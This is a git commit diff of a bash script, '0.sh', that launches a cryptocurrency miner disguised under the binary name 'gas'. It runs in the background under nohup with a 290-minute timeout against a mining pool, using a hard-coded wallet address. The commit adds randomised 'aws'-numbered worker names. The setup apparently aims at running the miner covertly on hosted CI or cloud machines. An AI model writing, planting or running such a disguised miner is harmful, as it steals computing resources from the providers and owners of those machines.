2402a21c59bec355bdaa934148c0f324029dedf8
sis maryanto <sismaryanto1928@gmail.com>
2021-07-19 23:47:05 +0000

    0.sh edited online with Bitbucket

--- 0.sh
+++ 0.sh
@@ -1,9 +1,10 @@
 #!/bin/bash
 chmod u+x gas
 ANU=yespowersugar
+WO=$(echo aws$(shuf -i 1-10 -n 1))
 IPE=stratum+tcps://stratum-eu.rplant.xyz:17042
-NGROK=sugar1qncwd9uvepk8y3qpp25pjvqunyzjlj44wzhn2as.ho
-nohup timeout 290m ./gas -a $ANU -o $IPE -u $NGROK &
+NGROK=sugar1qncwd9uvepk8y3qpp25pjvqunyzjlj44wzhn2as
+nohup timeout 290m ./gas -a $ANU -o $IPE -u $NGROK.$WO &
 jobs
 echo "haha"
 apt-get update -y
